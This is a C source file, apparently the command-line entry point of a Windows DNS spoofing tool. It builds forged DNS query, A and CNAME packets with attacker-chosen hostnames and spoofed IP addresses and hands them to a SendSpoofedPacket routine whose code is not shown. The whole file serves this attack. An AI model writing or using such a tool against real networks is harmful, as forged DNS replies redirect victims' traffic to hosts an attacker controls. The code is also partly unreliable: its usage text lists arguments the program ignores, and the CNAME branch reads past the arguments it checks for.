#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Shlwapi.h>

#include "DNS.h"
#include "DNSForge.h"
#include "Helper.h"
//#include "CreateDnsQueryPacket.h"
//#include "CreateDnsResponse_A.h"
//#include "CreateDnsResponse_CNAME.h"
#include "SendSpoofedPacket.h"

#pragma comment(lib, "Ws2_32")
#pragma comment(lib, "Shlwapi")


void PrintUsage(char *progName)
{
  char *aHost = "a.host.com";
  char *theRealHost = "cname.host.com";
  char *resolvedIP = "192.168.0.14";
  
  system("cls");
  printf("Usage:  %s (Q|A|CNAME) srcIP dstIP ...\n\n", progName);
  printf("%s Q %s\n", progName, aHost);
  printf("\tCompile a\t\tDNS Query\n\t for\t\t\t%s\n\n", aHost);

  printf("%s A %s %s\n", progName, aHost, resolvedIP);
  printf("\tCompile a\t\tDNS reply\n\
\t with type\t\tA\n\
\t for\t\t\t%s\n\
\t resolving to\t\t%s\n\n",
    aHost, resolvedIP);

  printf("%s CNAME %s %s %s\n", progName, aHost, theRealHost, resolvedIP);
  printf("\tCompile a \t\tDNS reply\n\
\t with type\t\tCNAME\n\
\t for\t\t\t%s\n\
\t pointing to\t\t%s\
\t resolving to\t\t%s\n\n",
    aHost, theRealHost, resolvedIP);
}

int main(int argc, char *argv[]) 
{
  PACKET_CUSTOMISATION packetData;
  char *instr = NULL;

  if (argc <= 2)
  {
    PrintUsage(argv[0]);
    exit(1);
  }



  ZeroMemory(&packetData, sizeof(packetData));
  instr = argv[1];

  if (!StrCmpI(instr, "Q") && argc >= 3)
  {
    packetData.type = DNS_QUERY;
    packetData.hostname = (unsigned char *)argv[2];
    packetData.transactionId = 0xB33F;
    packetData.ttl = 0xDEADBEEF;

    SendSpoofedPacket(packetData);
  }
  else if (!StrCmpI(instr, "A") && argc >= 4)
  {
    packetData.type = DNS_A;
    packetData.hostname = (unsigned char *)argv[2];
    packetData.spoofedIpAddress = (unsigned char *)argv[3];
    packetData.transactionId = 0xB33F;
    packetData.ttl = 0xDEADBEEF;

    SendSpoofedPacket(packetData);
  }
  else if (!StrCmpI(instr, "CNAME") && argc >= 4)
  {
    packetData.type = DNS_CNAME;
    packetData.hostname = (unsigned char *)argv[2];
    packetData.spoofedIpAddress = (unsigned char *)argv[4];
    packetData.canonicalHost = (unsigned char *)argv[3];
    packetData.transactionId = 0xB33F;
    packetData.ttl = 0xDEADBEEF;

    SendSpoofedPacket(packetData);
  }
  else
  {
    PrintUsage(argv[0]);
  }


  return 0;
}